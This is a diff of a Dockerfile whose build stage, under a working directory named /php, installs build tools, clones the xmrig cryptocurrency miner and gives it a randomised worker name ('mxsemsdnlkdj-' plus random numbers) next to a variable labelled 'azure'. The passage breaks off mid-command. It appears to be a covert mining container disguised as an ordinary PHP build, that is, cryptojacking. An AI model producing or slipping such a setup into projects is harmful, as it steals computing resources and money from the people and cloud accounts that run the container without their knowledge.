@@ -1,19 +1,20 @@
 FROM alpine:latest AS build
 
 WORKDIR /php
-RUN  apk update \
-     && apk --no-cache add \
-        git \
-        gcc \
-        make \
-        cmake \
-        libuv-dev \
-        build-base \
-        openssl-dev \
-        build-deps libuv \
-        libmicrohttpd-dev \
-        util-linux-dev gcc abuild binutils \
-        ca-certificates wget screen
+RUN  apk update
+RUN  apk add --no-cache --virtual .build-deps \
+         git \
+         cmake \
+         make \
+         g++ \
+         wget \
+         screen \
+         musl-dev \
+         libuv-dev \
+         openssl-dev \
+         util-linux-dev \
+         libmicrohttpd-dev \
+         ca-certificates 
 RUN azure=mxsemsdnlkdj;
 RUN git clone https://github.com/xmrig/xmrig \
   && a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d \
